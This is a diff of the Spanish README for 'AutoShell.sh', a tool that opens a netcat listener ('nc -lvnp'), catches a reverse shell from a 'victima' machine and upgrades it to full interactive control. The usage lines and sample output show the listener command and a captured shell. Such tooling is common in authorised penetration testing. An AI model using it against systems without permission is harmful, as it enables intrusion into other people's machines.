@@ -13,23 +13,26 @@ chmod +x AutoShell.sh
 ## 🛠 Uso básico
 
 ```bash
-./AutoShell.sh 4444
+# Modo básico
+./AutoShell.sh <puerto>
+
+# Especificar IP y puerto
+./AutoShell.sh <ip> <puerto>
 ```
 
 ## 🌟 Ejemplo de uso
 
 ```bash
 $ ./AutoShell.sh 4444
-[*] Iniciando listener en Todas las interfaces:4444
-[*] Ejecutando: nc -lvnp 4444
+[*] Iniciando listener en 0.0.0.0:4444
+[*] Comando: nc -lvnp 4444
 [*] Esperando conexión...
-connect to [192.168.10.100] from (UNKNOWN) [192.168.10.101] 53944
+connect to [192.168.1.10] from (UNKNOWN) [192.168.1.20] 55892
 [+] Conexión establecida
-[*] Mejorando shell...
-[+] Shell mejorada con éxito!
-[+] Shell estabilizada correctamente
-[*] Transfiriendo control al usuario...
-user@victim:/home/user$  # <-- Aquí tienes control directo y permanente
+[*] Estabilizando shell...
+[+] Shell lista! Tomando control...
+
+user@victima:/home$  # Shell completamente interactiva
 ```
 
 ## 🛡 Características clave
